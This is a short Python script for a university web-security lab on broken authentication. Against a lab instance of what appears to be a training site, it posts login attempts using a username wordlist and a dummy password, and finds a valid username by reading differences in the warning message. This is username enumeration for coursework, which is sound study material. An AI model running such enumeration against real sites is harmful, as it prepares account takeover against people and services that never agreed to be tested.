# for CS 495 - Web and Cloud Security Lab 1.3 - Broken Authentication

import requests
# import sys
from bs4 import BeautifulSoup

s = requests.session()

site = "ac311fe21f55517b800c5b99009a0026.web-security-academy.net"
login_url = f'''https://{site}/login'''

username_list = open("Authentication-lab-usernames.txt", "r").readlines()
password_list = open("Authentication-lab-passwords.txt", "r").readlines()

for user in username_list:
    target = user.strip()
    login_data = {
        'username': target,
        'password': 'foo'
    }

    resp = s.post(login_url, data=login_data)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if 'username' not in soup.find('p', {'class': 'is-warning'}).text:
        print(f'Username is: {target}')
        break
